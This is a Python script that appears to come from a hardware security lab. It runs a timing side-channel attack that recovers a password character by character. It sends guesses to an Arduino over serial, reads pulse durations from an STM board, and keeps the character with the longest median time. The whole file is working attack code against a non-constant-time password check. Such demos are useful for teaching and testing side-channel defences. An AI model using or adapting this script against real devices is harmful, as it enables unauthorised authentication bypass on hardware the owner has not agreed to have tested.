import serial
import time
import statistics
from tqdm import tqdm

def send_password_to_arduino(arduino_serial, password):
    """Send a password to the Arduino."""
    arduino_serial.write(f"{password}\n".encode())

def wait_for_arduino_response(arduino_serial):
    """Wait for a response from the Arduino."""
    while True:
        response = arduino_serial.readline().decode().strip()
        if response:
            return response

def measure_execution_time(stm_serial):
    """Measure the execution time from the STM."""
    while True:
        response = stm_serial.readline().decode().strip()
        if response.startswith("Pulse Duration:"):
            return int(response.split(":")[1].strip().split()[0])  # Extract time in ns

def timing_attack(repetitions=8):
    known_password = ""  # Discovered password
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Possible characters

    # Open serial connections
    with serial.Serial('COM5', 9600, timeout=1) as arduino_serial, \
         serial.Serial('COM4', 115200, timeout=1) as stm_serial:

        arduino_serial.reset_input_buffer()
        stm_serial.reset_input_buffer()
        time.sleep(2)  # Wait for the serial connections to be established
        for _ in tqdm(range(MAX_PASSWORD_LENGTH), desc="Discovering password"):
            timings = []

            for char in tqdm(charset, desc="Testing characters", leave=False):
                test_password = known_password + char + "A" * ((MAX_PASSWORD_LENGTH-1) - len(known_password))  # Padding
                repeated_timings = []

                # Repeat measurements to calculate median
                for _ in range(repetitions):
                    send_password_to_arduino(arduino_serial, test_password)
                    wait_for_arduino_response(arduino_serial)  # Wait for Arduino's response
                    exec_time = measure_execution_time(stm_serial)  # Measure timing from STM
                    repeated_timings.append(exec_time)

                # Calculate median timing for the current character
                median_time = statistics.median(repeated_timings)
                timings.append((char, median_time))

            # Find the character with the longest median execution time
            best_char = max(timings, key=lambda x: x[1])[0]
            known_password += best_char
            print(f"\nDiscovered sequence so far: {known_password}")

        return known_password

# Run the attack
if __name__ == "__main__":
    MAX_PASSWORD_LENGTH = 8
    print("Starting timing attack...")
    repetitions = 5  # Number of repetitions to calculate the median
    recovered_password = timing_attack(repetitions)
    print(f"Discovered password: {recovered_password}")
